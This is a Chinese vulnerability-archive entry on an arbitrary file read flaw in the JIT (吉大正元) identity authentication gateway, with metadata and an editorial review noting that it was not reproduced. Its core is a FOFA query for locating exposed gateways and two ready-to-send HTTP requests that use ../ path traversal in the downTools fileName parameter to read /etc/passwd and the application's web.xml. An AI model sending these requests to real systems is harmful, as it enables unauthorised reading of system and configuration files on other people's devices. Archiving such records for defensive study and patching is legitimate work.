---
source: "wy876 漏洞文库"
id: "vw-3d585d22338d5ab8f17ffdd1"
entity_id: "ve-3d585d22338d5ab8f17ffdd1"
schema_version: "1"
fofa_unverified: "title="
title: "吉大正元身份认证网关downtools存在任意文件读取漏洞"
product: "吉大正元身份认证网关"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "Linux布局，无会话，版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%90%89%E5%A4%A7%E6%AD%A3%E5%85%83/%E5%90%89%E5%A4%A7%E6%AD%A3%E5%85%83%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BD%91%E5%85%B3downtools%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ercgu609qmwqlr09"
source_status: "recorded"
---

# 吉大正元身份认证网关downtools存在任意文件读取漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：吉大正元身份认证网关
- 本文讨论：downTools fileName遍历
- 版本、权限与配置前提：Linux布局，无会话，版本未知
- 资料类型：文件读取双路径请求；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- title中downtools大小写与实际downTools不一致，应标准化
- 缺响应/版本，特定源码web.xml路径不可泛用；FOFA元数据残缺
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 返回证据和部署路径/修复待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
 吉大正元身份认证网关是提供内部网络的接入控制以及对接入用户进行强身份认证和审计服务的产品，解决用户使用应用系统时涉及的身份验证、信息保密、权限控制等安全问题。吉大正元身份认证网关downtools存在任意文件读取漏洞。

# 二、影响版本
+ 吉大正元身份认证网关

# 三、资产测绘
+ fofa`title="吉大正元身份认证网关"`
+ 特征


# 四 、漏洞复现
```http
GET /jit_pnx_portal/downTools?fileName=../../../../../../../../../etc/passwd HTTP/1.1
Host: 
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
```


```http
GET /jit_pnx_portal/downTools?fileName=../../../../../../../../../home/gateway/src/main/webapp/WEB-INF/web.xml HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:131.0) Gecko/20100101 Firefox/131.0
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
X-Requested-With: XMLHttpRequest
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ercgu609qmwqlr09>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
